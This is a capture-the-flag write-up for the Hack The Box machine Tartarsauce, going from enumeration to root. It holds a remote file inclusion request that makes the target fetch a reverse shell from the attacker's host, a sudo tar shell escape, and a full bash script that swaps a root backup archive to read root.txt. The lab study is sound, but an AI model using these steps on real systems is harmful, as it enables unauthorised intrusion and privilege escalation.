## Hack The Box -- Tartarsauce -- 10.129.1.185 


### Enumeration


- First I'll start out with an nmap scan. I like running this default one-liner for doing CTF's.

	#!/bin/bash

	TARGET=10.129.1.185 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -A -vv $TARGET -oN nmap/nmap-all-tcp.nmap

- I word of caution though. If you use that script make sure you have an nmap directory in your working directory or just change the -oN flag.


- From the nmap scan on tartarsauce it looks like just port 80 is open. That definitely narrows down our attack surface. Web it is.

#### Nmap scan of target


	PORT   STATE SERVICE REASON         VERSION
	80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	| http-robots.txt: 5 disallowed entries 
	| /webservices/tar/tar/source/ 
	| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
	|_/webservices/developmental/ /webservices/phpmyadmin/
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-title: Landing Page
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
	Aggressive OS guesses: Linux 3.18 (96%), Linux 3.2 - 4.9 (96%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Linux 3.13 (93%), DD-WRT v3.0 (Linux 4.4.2) (93%), Linux 4.10 (93%)
	No exact OS matches for host (test conditions non-ideal).
	TCP/IP fingerprint:
	SCAN(V=7.94SVN%E=4%D=10/14%OT=80%CT=%CU=35087%PV=Y%DS=2%DC=T%G=N%TM=670D9742%P=aarch64-unknown-linux-gnu)
	SEQ(SP=101%GCD=1%ISR=103%TI=Z%CI=I%II=I%TS=A)
	OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
	WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
	ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)
	T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
	T2(R=N)
	T3(R=N)
	T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
	IE(R=Y%DFI=N%T=40%CD=S)

	Uptime guess: 8.041 days (since Sun Oct  6 16:13:49 2024)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=257 (Good luck!)
	IP ID Sequence Generation: All zeros

	TRACEROUTE (using port 80/tcp)
	HOP RTT      ADDRESS
	1   62.82 ms 10.10.14.1
	2   64.33 ms 10.129.1.185


- If we browse to the Website it just shows us a big picture of a Tartarsauce bottle with 'Welcome to Tartarsauce' title.

![](/Tartarsauce/images/website-image.png) 

- From nmap and wappalizer the site appears to be running Apache Webserver. I'm going to to a directory scan and since it's Apache there's likely some php files. But there could also be some txt, html, etc.

- I ran a feroxbuster scan with an apache fuzz list from seclists. We can see a /webservices directory, but the only 200 reponse we get is from index.html and /. Below are some of the directories is found with a 404 and 304 error code.

1. /webservices/monstra-3.0.4
2. webservices/easy-file-uploader
3. /webservices/tar/tar
4. /webservices/tar
5. /webservices/phpmyadmin
6. /
7. index.html


![directories](/Tartarsauce/images/feroxbuster.png) 


- Trying to navigate to /webservices/easy-file-uploader gives us a 'Not Found' message.

![404](/Tartarsauce/images/404.png) 


- If I go to the /webservices/monstra-3.0.4/ directory I get a home page that looks like is running monstra 3.0.4. Maybe this is some type of CMS application.



![monstra](/Tartarsauce/images/monstra.png) 


- It looks like monstra is a CMS platform and has several known vulnerabilites but all the exploits require credentials which we don't yet have.

![exploit](/Tartarsauce/images/exploits.png) 

- I just tried inputting default creds at the login page of admin:admin and it worked. I'm going to go back and look at some of the exploits that I saw earlier for authenticated RCE.


![Monstra](/Tartarsauce/images/login.png) 


- I found a python exploit that takes the following arguments:

1. -T 'Target IP' - 10.129.1.185
2. -P 'Target Port' - 80
3. -U 'Monstra CMS Path' /webservices/monstra-3.0.4/
4. -u 'username' admin
5. -p admin

- I lets try this and see if it works: python3 monstra-rce.py -T 10.129.1.185 -P 80 -U /webservices/monstra-3.0.4/ -u admin -p admin


![exploit](/Tartarsauce/images/exploit-args.png) 

- After running the exploit this is the message that I get. 

- After numerous times of not being able to get the exploit to work it guessing this is a rabbit hole. 

![exploit](/Tartarsauce/images/run.png) 

## Update & Foothold

- Turns out the Monstra exploit is a rabbithole. I reran feroxbuster against the box and found another Wordpress site hosted at /webservices/wp/ and it has a vulnerable plugin and version running on Tartarsauce. 

![wordpress](/Tartarsauce/images/wordpress.png) 

- For the wpscan I added the following flags:

- -e for enumerate, at = all themes, ap = all plugins, u = users, cb = config backups
- --url URL where the wordpress site is hosted.
- --plugin-detection aggressive = aggressively scans for plugins
- --plugin-detection-version = aggressive, aggressively scan for plugin versions
- -t for theads
- -o for output file.

- wpscan has a lot of flags so it can be tuned precisely for each scan.


![Vuln Plugin](/Tartarsauce/images/wpscan.png) 

- Viewing the output of wpscan I found this vulnerable plugin running on the target and after googling a bit there are serveral vulnerabilities associated with this plugin.



![plugin](/Tartarsauce/images/gwolle.png) 

- I found this info about the exploit: 

> - HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:
        
- http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]     


- In order to exploit this vulnerability 'allow_url_include' shall be set to 1. Otherwise, attacker may still include local files and also execute arbitrary code.

- Im going to start a python listener on my kali box and make a curl request for http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.240 



![plugin](/Tartarsauce/images/curl.png) 



![plugin](/Tartarsauce/images/curl-1.png) 



- When I make a curl request with my listener it returns "GET /wp-load.php HTTP/1.0" 404. I'm going to put a reverse shell in my working directory called wp-load.php and make the same curl request and see it if will grab by reverse shell and execute it.


![plugin](/Tartarsauce/images/curl-2.png) 


- We get a callback on our listener and have a shell as www-data. 

- Running sudo -l we can run /bin/tar

![plugin](/Tartarsauce/images/sudo.png) 


- Looking at [gtfobins](https://gtfobins.github.io/gtfobins/tar/) we can see an option for sudo. sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-exec=/bin/sh

- Look closer we can only run it as the user onuma so we need to add the sudo -u onuma to run it as that user.

- Now we have a shell as the user onuma and can grab the user.txt flag.


![Priv](/Tartarsauce/images/user.png) 


### Privilege Escalation


- Running uname -a we can see this is a 32 bit machine. So i'll transfer a 32 bit version of pspy to the host and run it and see if I can find anything interesting.


![priv](/Tartarsauce/images/pspy.png) 


- Looking at pspy output we can we a backuperer script that runs every so often. There's a backuperer.service cronjob that's running on the host. 

- Taking a look at the backuperer we can exploit the sleep command in this script. I wrote my own bash script to do this and will upload it to the host.

![cron](/Tartarsauce/images/cron.png) 

### Bash exploit script

	#!/bin/bash

	# work out of shm
	cd /dev/shm

	# set both start and cur equal to any backup file if it's there
	start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
	cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

	# loop until there's a change in cur
	echo "Waiting for archive filename to change..."
	while [ "$start" == "$cur" -o "$cur" == "" ] ; do
	    sleep 10;
	    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
	done

	# Grab a copy of the archive
	echo "File changed... copying here"
	cp $cur .

	# get filename
	fn=$(echo $cur | cut -d'/' -f4)

	# extract archive
	tar -zxf $fn

	# remove robots.txt and replace it with link to root.txt
	rm var/www/html/robots.txt
	ln -s /root/root.txt var/www/html/robots.txt

	# remove old archive
	rm $fn

	# create new archive
	tar czf $fn var

	# put it back, and clean up
	mv $fn $cur
	rm $fn
	rm -rf var

	# wait for results
	echo "Waiting for new logs..."
	tail -f /var/backups/onuma_backup_error.txt
	

- Now if we wait for the cronjob to execute again we should get the root.txt file hash.

- The backup script run and executes our exploit script and we get the root file hash.

![root](/Tartarsauce/images/root.png) 
